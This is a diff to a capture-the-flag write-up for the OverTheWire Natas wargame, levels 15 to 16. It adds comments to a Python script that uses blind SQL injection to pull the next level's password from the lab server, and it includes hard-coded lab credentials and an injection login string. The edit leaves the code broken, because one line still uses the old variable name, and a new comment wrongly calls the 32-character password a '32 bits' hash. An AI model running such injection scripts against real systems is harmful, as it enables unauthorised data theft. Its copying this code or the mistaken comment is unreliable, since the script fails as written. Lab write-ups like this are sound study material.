@@ -85,29 +85,34 @@ SQL injection string - username is `admin` and password is `" or "1"="1`
 ### Level 15 -> 16
 >Credentials are username - _natas15_	and password - _TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB_
 
-Blind SQL injection. Py code for blind injection. 
+Blind SQL injection, its like trial and error method of performing SQL queries to retrieve the desired data (google to learn more).
+
+Py code for blind injection. 
 ```python
 import re, requests
 
 url = 'http://natas15.natas.labs.overthewire.org/index.php'
 auth = ('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB') #auth creds from the previous challenge
 
-passwdlist = []
+passwordlist = []
 ch = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" #charset
-#the next 2 lines were written to understand the response of the query made. Then the rest of the code was built after understanding the TRUE and the FALSE response we receive. 
+
+#the next 2 lines were written to understand the response of the SQL query performed.
 #resp = requests.get(url,auth=auth, params = {"username":"natas16\" and password like binary \"%"})
 #print(resp.text)
-for i in range(32):
-    for j in ch:
-        resp = requests.get(url,auth=auth, params = {"username":"natas16\" and password like binary \""+"".join(passwdlist)+j+"%"})
-        if "This user exists" in resp.text: #if we get a TRUE response, we append that character into a list. 
+
+#Then the rest of the code was built after understanding the TRUE and the FALSE response we received. 
+for i in range(32): #we know that the hash is 32 bits long, so we will need to guess 32 characters and hence iterate 32 times.
+    for j in ch: #iterate through every character from the charset
+        resp = requests.get(url,auth=auth, params = {"username":"natas16\" and password like binary \""+"".join(passwdlist)+j+"%"}) #perform a get request
+        if "This user exists" in resp.text: #if we get a TRUE response, it means a character matches the original hash. 
             print(f"The character no {i+1} of the password found is : {j}")
-            passwdlist.append(j)
+            passwordlist.append(j) #append the matching character to the hash
             break
 
-passwd = "".join(passwdlist)
+password = "".join(passwordlist)
 
-print(f"\nThe password for Natas Level 16 is : {passwd}")
+print(f"\nThe password for Natas Level 16 is : {password}")
 
 ```
 
